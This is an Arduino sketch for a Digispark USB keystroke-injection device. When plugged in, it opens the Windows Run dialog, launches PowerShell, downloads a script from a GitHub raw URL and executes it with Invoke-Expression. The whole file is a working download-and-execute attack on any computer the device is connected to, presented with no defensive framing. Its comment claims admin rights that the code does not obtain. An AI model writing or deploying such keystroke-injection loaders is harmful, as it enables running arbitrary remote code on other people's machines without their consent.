#include "DigiKeyboard.h"

void setup() {
  // open run command and launch powershell as admin
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // download payload from github
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$scriptURL = 'https://raw.githubusercontent.com/Desk1/arduinosc/main/payload.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT);
  DigiKeyboard.print("$scriptContent = Invoke-WebRequest -Uri $scriptURL ");
  DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_LEFT);
  DigiKeyboard.print(" Select-Object -ExpandProperty Content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT);

  //execute payload
  DigiKeyboard.print("Invoke-Expression -Command $scriptContent");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
